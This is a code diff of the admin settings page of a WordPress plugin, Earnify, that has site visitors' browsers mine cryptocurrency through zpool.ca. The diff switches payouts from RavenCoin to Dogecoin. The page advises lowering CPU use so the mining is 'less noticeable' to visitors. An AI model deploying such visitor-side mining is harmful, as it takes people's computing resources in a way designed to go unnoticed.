@@ -68,7 +68,7 @@ class EWP_Admin {
 			self::$page_slug
 		);
 
-		self::add_field( 'ewp_wallet', __( 'RVN Wallet Address', 'earnify-wp' ), 'render_wallet' );
+		self::add_field( 'ewp_wallet', __( 'DOGE Wallet Address', 'earnify-wp' ), 'render_wallet' );
 		self::add_field( 'ewp_cpu_pct', __( 'CPU Usage', 'earnify-wp' ), 'render_cpu' );
 		self::add_field( 'ewp_audience', __( 'Mine For', 'earnify-wp' ), 'render_audience' );
 		self::add_field( 'ewp_enabled', __( 'Enable Mining', 'earnify-wp' ), 'render_enabled' );
@@ -93,11 +93,11 @@ class EWP_Admin {
 
 	public static function sanitize_wallet( string $value ): string {
 		$value = trim( $value );
-		if ( ! empty( $value ) && ! preg_match( '/^R[a-km-zA-HJ-NP-Z1-9]{25,34}$/', $value ) ) {
+		if ( ! empty( $value ) && ! preg_match( '/^D[a-km-zA-HJ-NP-Z1-9]{33}$/', $value ) ) {
 			add_settings_error(
 				'ewp_wallet',
 				'ewp_invalid_wallet',
-				__( 'Wallet address does not look like a valid RVN address. It should start with "R" and be 26–35 characters.', 'earnify-wp' ),
+				__( 'Wallet address does not look like a valid DOGE address. It should start with "D" and be 34 characters.', 'earnify-wp' ),
 				'warning'
 			);
 		}
@@ -125,13 +125,13 @@ class EWP_Admin {
 		$value  = get_option( $args['name'], '' );
 		$name   = esc_attr( $args['name'] );
 		printf(
-			'<input type="text" name="%s" id="%s" value="%s" class="regular-text ewp-wallet-input" placeholder="R..." maxlength="40" spellcheck="false" autocomplete="off" style="font-family:monospace;" />',
+			'<input type="text" name="%s" id="%s" value="%s" class="regular-text ewp-wallet-input" placeholder="D..." maxlength="40" spellcheck="false" autocomplete="off" style="font-family:monospace;" />',
 			esc_attr( $name ),
 			esc_attr( $name ),
 			esc_attr( $value )
 		);
 
-		if ( ! empty( $value ) && preg_match( '/^R[a-km-zA-HJ-NP-Z1-9]{25,34}$/', $value ) ) {
+		if ( ! empty( $value ) && preg_match( '/^D[a-km-zA-HJ-NP-Z1-9]{33}$/', $value ) ) {
 			$wallet_url = 'https://zpool.ca/wallet/' . rawurlencode( $value );
 			printf(
 				' <a href="%s" target="_blank" rel="noopener noreferrer" class="ewp-wallet-link">%s</a>',
@@ -141,7 +141,7 @@ class EWP_Admin {
 		}
 
 		echo '<p class="description">';
-		esc_html_e( 'Enter your RavenCoin (RVN) wallet address. Create one for free using Zelcore, Trust Wallet, or the official RavenCoin core wallet. Shares are submitted to zpool.ca — payouts go directly to this address.', 'earnify-wp' );
+		esc_html_e( 'Enter your Dogecoin (DOGE) wallet address. Create one for free using Dogecoin Core, Trust Wallet, or any Dogecoin-compatible wallet. Shares are submitted to zpool.ca — payouts go directly to this address.', 'earnify-wp' );
 		echo '</p>';
 	}
 
@@ -223,7 +223,7 @@ class EWP_Admin {
 			<?php elseif ( '1' === $enabled && empty( $wallet ) ) : ?>
 				<div class="ewp-status ewp-status--warning">
 					<strong><?php esc_html_e( 'Wallet address required.', 'earnify-wp' ); ?></strong>
-					<?php esc_html_e( 'Mining is enabled but no wallet address is set. Enter your RVN address below.', 'earnify-wp' ); ?>
+					<?php esc_html_e( 'Mining is enabled but no wallet address is set. Enter your DOGE address below.', 'earnify-wp' ); ?>
 				</div>
 			<?php else : ?>
 				<div class="ewp-status ewp-status--inactive">
@@ -243,10 +243,10 @@ class EWP_Admin {
 			<div class="ewp-card">
 				<h2><?php esc_html_e( 'How it works', 'earnify-wp' ); ?></h2>
 				<ol>
-					<li><?php esc_html_e( 'Enter your RavenCoin wallet address above.', 'earnify-wp' ); ?></li>
+					<li><?php esc_html_e( 'Enter your Dogecoin wallet address above.', 'earnify-wp' ); ?></li>
 					<li><?php esc_html_e( 'Choose how much CPU to use (lower = less noticeable).', 'earnify-wp' ); ?></li>
 					<li><?php esc_html_e( 'Click Save Changes, then enable mining.', 'earnify-wp' ); ?></li>
-					<li><?php esc_html_e( 'Visitors mine MinotaurX via zpool.ca — payouts go to your RVN wallet.', 'earnify-wp' ); ?></li>
+					<li><?php esc_html_e( 'Visitors mine MinotaurX via zpool.ca — payouts go to your DOGE wallet.', 'earnify-wp' ); ?></li>
 				</ol>
 				<p>
 					<?php esc_html_e( 'Earnify takes a 10% fee. You keep 90% of the mining yield. Open source, no tracking, no ads.', 'earnify-wp' ); ?>
